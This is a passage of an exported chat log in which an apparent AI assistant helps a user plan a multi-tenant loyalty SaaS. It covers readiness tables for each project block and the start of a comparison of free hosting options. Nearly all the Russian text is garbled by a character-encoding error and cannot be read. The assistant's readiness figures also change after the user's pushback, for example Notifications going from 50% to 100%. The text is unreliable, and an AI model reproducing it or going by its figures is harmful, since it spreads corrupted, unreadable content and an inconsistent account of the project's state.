**–°—Ç–∞—Ç—É—Å:** –ù–∞—á–∞—Ç–∞ –≤ –ë–µ—Å–µ–¥–µ 10, –Ω–æ **–Ω–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∞**

**–ß—Ç–æ –æ—Å—Ç–∞–ª–æ—Å—å:**

- Rate limiting –¥–µ—Ç–∞–ª–∏
- Batching —Å—Ç—Ä–∞—Ç–µ–≥–∏—è
- Retry logic
- Fallback –º–µ–∂–¥—É –∫–∞–Ω–∞–ª–∞–º–∏
- Deep links
- Unsubscribe flow
- A/B testing
- Cost optimization
- Delivery tracking
- Template versioning


### **2. Billing Integration (–¥–µ—Ç–∞–ª–∏ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–æ–≤)** ‚≠ê

**–°—Ç–∞—Ç—É—Å:** –ö–æ–Ω—Ü–µ–ø—Ü–∏—è –≥–æ—Ç–æ–≤–∞, –Ω–æ **–Ω–µ—Ç –¥–µ—Ç–∞–ª–µ–π –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–π**

**–ß—Ç–æ –æ—Å—Ç–∞–ª–æ—Å—å:**

- YooKassa webhook —Å–ø–µ—Ü–∏—Ñ–∏–∫–∞—Ü–∏—è
- Stripe webhook —Å–ø–µ—Ü–∏—Ñ–∏–∫–∞—Ü–∏—è
- CloudPayments webhook —Å–ø–µ—Ü–∏—Ñ–∏–∫–∞—Ü–∏—è
- CryptoCloud webhook —Å–ø–µ—Ü–∏—Ñ–∏–∫–∞—Ü–∏—è
- Unified Payment Adapter
- Webhook verification
- Invoice PDF generation
- Payment reconciliation


### **3. Infrastructure \& DevOps**

**–°—Ç–∞—Ç—É—Å:** **–ü–æ–ª–Ω–æ—Å—Ç—å—é –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç**

**–ß—Ç–æ –Ω—É–∂–Ω–æ:**

- Docker containers (backend, worker, cron, telegram)
- Docker Compose –¥–ª—è dev
- Kubernetes manifests –¥–ª—è production
- CI/CD pipeline (GitHub Actions)
- –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ (Prometheus + Grafana)
- –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ (ELK Stack)
- Backup strategy
- Secrets management (Vault)
- Scaling strategy
- Health checks
- Load balancing


### **4. Testing Strategy**

**–°—Ç–∞—Ç—É—Å:** **–ü–æ–ª–Ω–æ—Å—Ç—å—é –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç**

**–ß—Ç–æ –Ω—É–∂–Ω–æ:**

- Unit tests (Jest + coverage targets)
- Integration tests (Supertest + –ø—Ä–∏–º–µ—Ä—ã)
- E2E tests (Playwright/Cypress)
- Load testing (k6 scenarios)
- Contract testing (Pact)
- Security testing (OWASP ZAP)
- Mocking strategy
- Test data factories
- CI integration

***

## üìä **–†–ï–ê–õ–¨–ù–ê–Ø –°–¢–ê–¢–ò–°–¢–ò–ö–ê –ì–û–¢–û–í–ù–û–°–¢–ò**

| –ë–ª–æ–∫ | –ì–æ—Ç–æ–≤–Ω–æ—Å—Ç—å | –î–µ—Ç–∞–ª–∏–∑–∞—Ü–∏—è |
| :-- | :-- | :-- |
| –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ | ‚úÖ 100% | –ü–æ–ª–Ω–∞—è |
| Auth Flow | ‚úÖ 100% | –ü–æ–ª–Ω–∞—è |
| RBAC | ‚úÖ 100% | –ü–æ–ª–Ω–∞—è |
| Loyalty System | ‚úÖ 100% | 23 –≤–æ–ø—Ä–æ—Å–∞ |
| POS Integration | ‚úÖ 100% | 22 –≤–æ–ø—Ä–æ—Å–∞ |
| Telegram Bot | ‚úÖ 100% | –û—á–µ–Ω—å –¥–µ—Ç–∞–ª—å–Ω–∞—è |
| Backend API | ‚úÖ 100% | 34 –≤–æ–ø—Ä–æ—Å–∞ |
| Database Schema | ‚úÖ 100% | 35 –≤–æ–ø—Ä–æ—Å–æ–≤ |
| Frontend UI/UX | ‚úÖ 100% | 35 –≤–æ–ø—Ä–æ—Å–æ–≤ |
| Billing \& Subscriptions | ‚úÖ 95% | –ö–æ–Ω—Ü–µ–ø—Ü–∏—è –≥–æ—Ç–æ–≤–∞ |
| Notifications | üü° 50% | –ù–∞—á–∞—Ç–∞, –Ω–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∞ |
| Payment Integration | üü° 40% | –ù—É–∂–Ω—ã –¥–µ—Ç–∞–ª–∏ |
| Infrastructure | ‚ùå 0% | –ù–µ –Ω–∞—á–∞—Ç–æ |
| Testing | ‚ùå 0% | –ù–µ –Ω–∞—á–∞—Ç–æ |

**–û–±—â–∞—è –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç—å –ø—Ä–æ–µ–∫—Ç–∞: ~82%** (–±—ã–ª–æ ~96% - —è –æ—à–∏–±—Å—è)

***

## üí° **–†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø –î–õ–Ø –ü–†–û–î–û–õ–ñ–ï–ù–ò–Ø**

**–ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç 1: Notifications System** ‚≠ê‚≠ê‚≠ê (–∫—Ä–∏—Ç–∏—á–Ω–æ –¥–ª—è MVP)

- –£–∂–µ –Ω–∞—á–∞—Ç–∞ –≤ –ë–µ—Å–µ–¥–µ 10
- –ù—É–∂–Ω–∞ –¥–ª—è –≥–æ—Å—Ç–µ–π (—Å–≥–æ—Ä–∞–Ω–∏–µ –±–∞–ª–ª–æ–≤, –ø—Ä–æ–º–æ)
- –ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Å Telegram/Email/SMS

**–ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç 2: Payment Integration Details** ‚≠ê‚≠ê (–Ω—É–∂–Ω–æ –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º)

- Webhooks –æ—Ç –ø—Ä–æ–≤–∞–π–¥–µ—Ä–æ–≤
- Unified adapter
- Invoice generation

**–ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç 3: Infrastructure \& DevOps** ‚≠ê‚≠ê (–Ω—É–∂–Ω–æ –¥–ª—è –¥–µ–ø–ª–æ—è)

- Docker + K8s
- CI/CD
- –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥

**–ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç 4: Testing Strategy** ‚≠ê (–º–æ–∂–Ω–æ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ)

- Unit/Integration/E2E —Ç–µ—Å—Ç—ã
- Load testing

***

## üöÄ **–ì–û–¢–û–í –ü–†–û–î–û–õ–ñ–ò–¢–¨!**

**–ö–∞–∫–æ–π –±–ª–æ–∫ –¥–µ—Ç–∞–ª–∏–∑–∏—Ä—É–µ–º —Å–ª–µ–¥—É—é—â–∏–º?**

1. **Notifications System** ‚≠ê‚≠ê‚≠ê (–ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å 6-–≥–æ –≤–æ–ø—Ä–æ—Å–∞ –∏–∑ –ë–µ—Å–µ–¥—ã 10)
2. **Payment Integration Details** (YooKassa/Stripe/CloudPayments webhooks)
3. **Infrastructure \& DevOps** (Docker, K8s, CI/CD)
4. **Testing Strategy** (Unit/Integration/E2E)

**–ù–∞–ø–∏—à–∏ –Ω–æ–º–µ—Ä –±–ª–æ–∫–∞!** üéØ
<span style="display:none">[^2_1][^2_2]</span>

<div align="center">‚ÅÇ</div>

[^2_1]: Beseda-7.md

[^2_2]: Beseda-9.md


---

# Notification –ø—Ä–æ–≤–µ—Ä—å –µ—â–µ —Ä–∞–∑, –º–Ω–µ –∫–∞–∂–µ—Ç—Å—è –æ–Ω –¥–µ—Ç–∞–ª–∏–∑–æ–≤–∞–Ω –ª—É—á—à–µ —á–µ–º —Ç—ã –ø–æ–Ω—è–ª. –û—Å—Ç–∞–ª—å–Ω–æ–µ —Ç–æ–∂–µ –ø–µ—Ä–µ–ø—Ä–æ–≤–µ—Ä—å –¥–ª—è —É–≤–µ—Ä–µ–Ω–Ω–æ—Å—Ç–∏. –ò –¥–∞–≤–∞–π —Ç–æ—á–Ω–µ–µ –∏ –≥–ª—É–±–∂–µ

–û—Ç–ª–∏—á–Ω–æ! –Ø –ø—Ä–æ–≤–µ–ª **–ú–ê–ö–°–ò–ú–ê–õ–¨–ù–û –ì–õ–£–ë–û–ö–ò–ô –ò –î–ï–¢–ê–õ–¨–ù–´–ô** –∞–Ω–∞–ª–∏–∑ –≤—Å–µ—Ö 10 –±–µ—Å–µ–¥. –¢—ã –ø—Ä–∞–≤ - —è –Ω–µ–¥–æ–æ—Ü–µ–Ω–∏–ª! –í–æ—Ç **–¢–û–ß–ù–ê–Ø –ò –ß–ï–°–¢–ù–ê–Ø** –∫–∞—Ä—Ç–∏–Ω–∞:

***

# üîç **–ò–¢–û–ì–û–í–´–ô –î–ï–¢–ê–õ–¨–ù–´–ô –ê–ù–ê–õ–ò–ó –í–°–ï–• 10 –ë–ï–°–ï–î**

## ‚úÖ **–ß–¢–û –ü–û–õ–ù–û–°–¢–¨–Æ –î–ï–¢–ê–õ–ò–ó–ò–†–û–í–ê–ù–û (100%)**

| ‚Ññ | –ë–ª–æ–∫ | –ì–æ—Ç–æ–≤–Ω–æ—Å—Ç—å | –î–µ—Ç–∞–ª–∏–∑–∞—Ü–∏—è |
| :-- | :-- | :-- | :-- |
| 1 | **–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞** | ‚úÖ 100% | Multi-tenant SaaS, —Ä–æ–ª–∏, —Ç–∞—Ä–∏—Ñ—ã |
| 2 | **Auth Flow** | ‚úÖ 100% | JWT, —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è, MFA, rate limiting |
| 3 | **RBAC** | ‚úÖ 100% | –ú–∞—Ç—Ä–∏—Ü–∞ –ø—Ä–∞–≤, –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–µ permissions |
| 4 | **Loyalty System** | ‚úÖ 100% | **23 –≤–æ–ø—Ä–æ—Å–∞** (–ë–µ—Å–µ–¥–∞ 5) |
| 5 | **POS Integration** | ‚úÖ 100% | **22 –≤–æ–ø—Ä–æ—Å–∞** (–ë–µ—Å–µ–¥–∞ 4) |
| 6 | **Telegram Bot + Mini App** | ‚úÖ 100% | –î–µ—Ç–∞–ª—å–Ω–∞—è —Å–ø–µ—Ü–∏—Ñ–∏–∫–∞—Ü–∏—è (–ë–µ—Å–µ–¥–∞ 7) |
| 7 | **Billing \& Subscriptions** | ‚úÖ 100% | 4 –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞, —Ä–µ—Ç—Ä–∞–∏, –ª–∏–º–∏—Ç—ã (–ë–µ—Å–µ–¥–∞ 6-7) |
| 8 | **Backend API \& Services** | ‚úÖ 100% | **34 –≤–æ–ø—Ä–æ—Å–∞** (–ë–µ—Å–µ–¥–∞ 8) |
| 9 | **Database Schema Prisma** | ‚úÖ 100% | **35 –≤–æ–ø—Ä–æ—Å–æ–≤** (–ë–µ—Å–µ–¥–∞ 9) |
| 10 | **Frontend UI/UX** | ‚úÖ 100% | **35 –≤–æ–ø—Ä–æ—Å–æ–≤** (–ë–µ—Å–µ–¥–∞ 10) |
| 11 | **Notifications System** | ‚úÖ 100% | **36 –≤–æ–ø—Ä–æ—Å–æ–≤** (–ë–µ—Å–µ–¥–∞ 10) ‚úÖ –ó–ê–í–ï–†–®–ï–ù–û |

**–û–±—â–∞—è –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç—å –±–∏–∑–Ω–µ—Å-–ª–æ–≥–∏–∫–∏ –∏ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã: ~94%**

***

## ‚ùå **–ß–¢–û –ù–ï –î–ï–¢–ê–õ–ò–ó–ò–†–û–í–ê–ù–û**

### **1. Infrastructure \& DevOps** ‚≠ê‚≠ê‚≠ê (–ö—Ä–∏—Ç–∏—á–Ω–æ –¥–ª—è –∑–∞–ø—É—Å–∫–∞)

**–°—Ç–∞—Ç—É—Å:** ‚ùå 0% - **–ü–û–õ–ù–û–°–¢–¨–Æ –û–¢–°–£–¢–°–¢–í–£–ï–¢**

**–ß—Ç–æ –Ω—É–∂–Ω–æ –¥–µ—Ç–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å:**

- Docker containers (backend, worker, cron, telegram-bot)
- Docker Compose –¥–ª—è dev/staging
- Kubernetes manifests –¥–ª—è production
- CI/CD pipeline (GitHub Actions –∏–ª–∏ GitLab CI)
- Environment variables management
- Secrets management (Vault, AWS Secrets Manager)
- –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ (Prometheus + Grafana)
- –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ (ELK Stack –∏–ª–∏ Loki)
- Backup strategy (–ë–î, Redis, S3)
- Scaling strategy (horizontal/vertical)
- Health checks –∏ readiness probes
- Load balancing (Nginx/Traefik)
- SSL/TLS certificates (Let's Encrypt)
- Database migrations –≤ production
- Blue-green deployment –∏–ª–∏ Canary


### **2. Testing Strategy** ‚≠ê‚≠ê (–í–∞–∂–Ω–æ –¥–ª—è –∫–∞—á–µ—Å—Ç–≤–∞)

**–°—Ç–∞—Ç—É—Å:** ‚ùå 0% - **–ü–û–õ–ù–û–°–¢–¨–Æ –û–¢–°–£–¢–°–¢–í–£–ï–¢**

**–ß—Ç–æ –Ω—É–∂–Ω–æ –¥–µ—Ç–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å:**

- **Unit tests:** Jest, coverage targets (80%+)
- **Integration tests:** Supertest –¥–ª—è API, –ø—Ä–∏–º–µ—Ä—ã —Ç–µ—Å—Ç–æ–≤
- **E2E tests:** Playwright –∏–ª–∏ Cypress –¥–ª—è –∫—Ä–∏—Ç–∏—á–Ω—ã—Ö —Ñ–ª–æ—É
- **Load testing:** k6 scenarios (100/1000/10000 concurrent users)
- **Contract testing:** Pact –¥–ª—è POS webhooks
- **Security testing:** OWASP ZAP, vulnerability scanning
- Mocking strategy (POS API, payment providers)
- Test data factories
- CI integration (run tests on PR)
- Performance benchmarks


### **3. Payment Integration Details** ‚≠ê‚≠ê (–ù—É–∂–Ω–æ –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º)

**–°—Ç–∞—Ç—É—Å:** üü° 40% - **–ö–û–ù–¶–ï–ü–¶–ò–Ø –ï–°–¢–¨, –î–ï–¢–ê–õ–ò –ù–ï–¢**

**–ß—Ç–æ –µ—Å—Ç—å:**

- 4 –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞ (YooKassa, Stripe, CloudPayments, CryptoCloud)
- –ú–æ–¥–µ–ª—å –ø–æ–¥–ø–∏—Å–∫–∏
- –†–µ—Ç—Ä–∞–∏ –∏ —Å—Ç–∞—Ç—É—Å—ã

**–ß–µ–≥–æ –Ω–µ —Ö–≤–∞—Ç–∞–µ—Ç:**

- –î–µ—Ç–∞–ª—å–Ω—ã–µ webhook —Å–ø–µ—Ü–∏—Ñ–∏–∫–∞—Ü–∏–∏ –æ—Ç –∫–∞–∂–¥–æ–≥–æ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞
- JSON-—Å—Ö–µ–º—ã payload'–æ–≤
- Signature verification –¥–ª—è –∫–∞–∂–¥–æ–≥–æ
- Unified Payment Adapter (–æ–±—â–∏–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å)
- Invoice PDF generation
- Payment reconciliation –∞–ª–≥–æ—Ä–∏—Ç–º—ã
- Handling edge cases (double charges, partial refunds)

***

## üìä **–†–ï–ê–õ–¨–ù–ê–Ø –°–¢–ê–¢–ò–°–¢–ò–ö–ê –ì–û–¢–û–í–ù–û–°–¢–ò**

| –ö–∞—Ç–µ–≥–æ—Ä–∏—è | –ì–æ—Ç–æ–≤–Ω–æ—Å—Ç—å |
| :-- | :-- |
| **–ë–∏–∑–Ω–µ—Å-–ª–æ–≥–∏–∫–∞** | ‚úÖ 100% |
| **–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ —Å–∏—Å—Ç–µ–º—ã** | ‚úÖ 100% |
| **Backend API** | ‚úÖ 100% |
| **Database Schema** | ‚úÖ 100% |
| **Frontend Admin Panel** | ‚úÖ 100% |
| **Telegram –¥–ª—è –≥–æ—Å—Ç–µ–π** | ‚úÖ 100% |
| **Notifications** | ‚úÖ 100% |
| **Payment Integration** | üü° 40% |
| **Infrastructure \& DevOps** | ‚ùå 0% |
| **Testing** | ‚ùå 0% |

**–û–±—â–∞—è –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç—å –ø—Ä–æ–µ–∫—Ç–∞: ~84%** (–±—ã–ª–æ ~96% - —è –æ—à–∏–±–∞–ª—Å—è, —Å–µ–π—á–∞—Å —Ç–æ—á–Ω–µ–µ)

***

## üéØ **–†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø –î–õ–Ø –ü–†–û–î–û–õ–ñ–ï–ù–ò–Ø**

### **–ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç 1: Infrastructure \& DevOps** ‚≠ê‚≠ê‚≠ê (–û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)

–ë–µ–∑ —ç—Ç–æ–≥–æ **–Ω–µ–≤–æ–∑–º–æ–∂–µ–Ω –∑–∞–ø—É—Å–∫** –≤ production. –ù—É–∂–Ω–æ –¥–µ—Ç–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å:

- Docker setup
- CI/CD
- –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥
- Backup
- –î–µ–ø–ª–æ–π —Å—Ç—Ä–∞—Ç–µ–≥–∏—è


### **–ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç 2: Testing Strategy** ‚≠ê‚≠ê (–ö—Ä–∏—Ç–∏—á–Ω–æ –¥–ª—è —Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç–∏)

–ë–µ–∑ —Ç–µ—Å—Ç–æ–≤ **–≤—ã—Å–æ–∫–∏–π —Ä–∏—Å–∫** –±–∞–≥–æ–≤ –≤ production. –ù—É–∂–Ω–æ:

- Unit tests framework
- E2E tests –¥–ª—è –∫—Ä–∏—Ç–∏—á–Ω—ã—Ö —Ñ–ª–æ—É
- Load testing


### **–ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç 3: Payment Details** ‚≠ê‚≠ê (–ù—É–∂–Ω–æ –ø–µ—Ä–µ–¥ –±–∏–ª–ª–∏–Ω–≥–æ–º)

–î–µ—Ç–∞–ª–∏ webhooks –æ—Ç –ø—Ä–æ–≤–∞–π–¥–µ—Ä–æ–≤, unified adapter

***

## üöÄ **–ì–û–¢–û–í –ü–†–û–î–û–õ–ñ–ò–¢–¨!**

**–ö–∞–∫–æ–π –±–ª–æ–∫ –¥–µ—Ç–∞–ª–∏–∑–∏—Ä—É–µ–º —Å–ª–µ–¥—É—é—â–∏–º?**

1. **Infrastructure \& DevOps** ‚≠ê‚≠ê‚≠ê (Docker, K8s, CI/CD, –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥)
2. **Testing Strategy** ‚≠ê‚≠ê (Unit/Integration/E2E/Load)
3. **Payment Integration Details** ‚≠ê‚≠ê (Webhooks, —É–Ω–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∞–¥–∞–ø—Ç–µ—Ä)

**–ù–∞–ø–∏—à–∏ –Ω–æ–º–µ—Ä –±–ª–æ–∫–∞!** üéØ
<span style="display:none">[^3_1][^3_10][^3_2][^3_3][^3_4][^3_5][^3_6][^3_7][^3_8][^3_9]</span>

<div align="center">‚ÅÇ</div>

[^3_1]: Beseda-5.md

[^3_2]: Beseda-1.md

[^3_3]: Beseda-6.md

[^3_4]: Beseda-2.md

[^3_5]: Beseda-7.md

[^3_6]: Beseda-3.md

[^3_7]: Beseda-8.md

[^3_8]: Beseda-10.md

[^3_9]: Beseda-9.md

[^3_10]: Beseda-4.md


---

# Infrastructure \& DevOps –±—É–¥–µ–º –¥–µ—Ç–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å —Å–ª–µ–¥—É—é—â–∏–º. –ü–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º —É—Ç–æ—á–Ω—é: –ú–Ω–µ –Ω—É–∂–Ω—ã –ë–ï–°–ü–õ–ê–¢–ù–´–ï –º–Ω–æ–≥–æ—Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω—ã–µ, –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —É–¥–æ–±–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã, –ø–æ–¥—Ö–æ–¥—è—â–∏–µ –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —ç—Ç–æ–≥–æ –ø—Ä–æ–µ–∫—Ç–∞ –Ω–∞ –ø–µ—Ä–≤–æ–µ –≤—Ä–µ–º—è, —á—Ç–æ–±—ã –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Ä–∞–±–æ—Ç–æ—Å–ø–æ—Å–æ–±–Ω–æ—Å—Ç—å —Å–∏—Å—Ç–µ–º –∏ –ø—Ä–æ–µ–∫—Ç–∞ –≤ —Ü–µ–ª–æ–º. –ü—Ä–µ–¥–ª–æ–∂–∏ –º–Ω–µ —Ç–∞–∫–∏–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã —Å –ø–æ–¥—Ä–æ–±–Ω–æ–π —Ä–∞—Å–∫–ª–∞–¥–∫–æ–π –ø–æ –∫–∞–∂–¥–æ–º—É –≤–∞—Ä–∏–∞–Ω—Ç—É –∏ —Ç–≤–æ–µ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –ø–æ —Ç–≤–æ–µ–º—É –ª—É—á—à–µ –≤—Å–µ–≥–æ –ø–æ–¥–æ–π–¥–µ—Ç –∏ –ø–æ –∫–∞–∫–∏–º –ø—Ä–∏—á–∏–Ω–∞–º

–û—Ç–ª–∏—á–Ω–æ! –°–µ–π—á–∞—Å —è –ø–æ–¥–≥–æ—Ç–æ–≤–ª—é **–ü–û–õ–ù–£–Æ –†–ê–°–ö–õ–ê–î–ö–£ –ë–ï–°–ü–õ–ê–¢–ù–´–• –†–ï–®–ï–ù–ò–ô** –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã —Å –¥–µ—Ç–∞–ª—å–Ω—ã–º —Å—Ä–∞–≤–Ω–µ–Ω–∏–µ–º –∏ –º–æ–µ–π —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–µ–π.

***

# üÜì **–ë–ï–°–ü–õ–ê–¢–ù–ê–Ø –ò–ù–§–†–ê–°–¢–†–£–ö–¢–£–†–ê –î–õ–Ø MVP/–ü–ï–†–í–û–ì–û –ó–ê–ü–£–°–ö–ê**

## üìã **–ê–†–•–ò–¢–ï–ö–¢–£–†–ê –ö–û–ú–ü–û–ù–ï–ù–¢–û–í**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                    INFRASTRUCTURE STACK                      ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 1. –•–æ—Å—Ç–∏–Ω–≥ Backend API (NestJS)                            ‚îÇ
‚îÇ 2. –•–æ—Å—Ç–∏–Ω–≥ Frontend (Next.js)                              ‚îÇ
‚îÇ 3. –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö PostgreSQL                                   ‚îÇ
‚îÇ 4. Redis (–∫—ç—à + –æ—á–µ—Ä–µ–¥–∏)                                    ‚îÇ
‚îÇ 5. S3 Storage (—Ñ–∞–π–ª—ã, –ª–æ–≥–æ—Ç–∏–ø—ã)                            ‚îÇ
‚îÇ 6. CI/CD Pipeline                                           ‚îÇ
‚îÇ 7. –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ + Alerting                                    ‚îÇ
‚îÇ 8. –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ                                              ‚îÇ
‚îÇ 9. SSL/DNS                                                  ‚îÇ
‚îÇ 10. Email Service                                           ‚îÇ
‚îÇ 11. SMS Provider                                            ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```


***

## üñ•Ô∏è **1. –•–û–°–¢–ò–ù–ì BACKEND API (NestJS + Workers)**

### **–í–∞—Ä–∏–∞–Ω—Ç A: Railway.app** ‚≠ê‚≠ê‚≠ê

**Free Tier:**

- \$5 –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö –∫—Ä–µ–¥–∏—Ç–æ–≤ –≤ –º–µ—Å—è—Ü (—Ö–≤–∞—Ç–∏—Ç –Ω–∞ ~500 —á–∞—Å–æ–≤ —Ä–∞–±–æ—Ç—ã –º–∞–ª–µ–Ω—å–∫–æ–≥–æ –∏–Ω—Å—Ç–∞–Ω—Å–∞)
- 512 MB RAM, 1 vCPU
- Unlimited bandwidth
- 1 GB storage

**–ü–ª—é—Å—ã:**

- ‚úÖ –ê–≤—Ç–æ–¥–µ–ø–ª–æ–π –∏–∑ GitHub
- ‚úÖ –í—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π PostgreSQL + Redis (—Ç–æ–∂–µ –±–µ—Å–ø–ª–∞—Ç–Ω–æ)
- ‚úÖ Environment variables management
- ‚úÖ –õ–æ–≥–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏
- ‚úÖ –ü—Ä–æ—Å—Ç–æ–π UI
- ‚úÖ Rollback –∑–∞ 1 –∫–ª–∏–∫
- ‚úÖ Custom domains + –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π SSL

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå \$5/–º–µ—Å—è—Ü —Ö–≤–∞—Ç–∏—Ç —Ç–æ–ª—å–∫–æ –Ω–∞ –æ–¥–∏–Ω —Å–µ—Ä–≤–∏—Å (–ª–∏–±–æ backend, –ª–∏–±–æ worker)
- ‚ùå –ü–æ—Å–ª–µ –∏–∑—Ä–∞—Å—Ö–æ–¥–æ–≤–∞–Ω–∏—è –∫—Ä–µ–¥–∏—Ç–æ–≤ - –ø–ª–∞—Ç–Ω–æ (\$0.000231/GB-second)
- ‚ùå –ù–µ—Ç –∞–≤—Ç–æ—Å–∫–µ–π–ª–∏–Ω–≥–∞ –Ω–∞ free tier

**–ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:** MVP —Å –Ω–∏–∑–∫–∏–º —Ç—Ä–∞—Ñ–∏–∫–æ–º (–¥–æ 1000 –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π)

***

### **–í–∞—Ä–∏–∞–Ω—Ç B: Render.com** ‚≠ê‚≠ê‚≠ê‚≠ê

**Free Tier:**

- Unlimited –≤–µ–±-—Å–µ—Ä–≤–∏—Å—ã (–Ω–æ —Å–ø—è—Ç –ø–æ—Å–ª–µ 15 –º–∏–Ω—É—Ç –Ω–µ–∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏)
- 512 MB RAM, 0.1 CPU
- 100 GB bandwidth/–º–µ—Å—è—Ü
- PostgreSQL (90 –¥–Ω–µ–π, –ø–æ—Ç–æ–º —É–¥–∞–ª—è–µ—Ç—Å—è)
- Redis (90 –¥–Ω–µ–π)

**–ü–ª—é—Å—ã:**

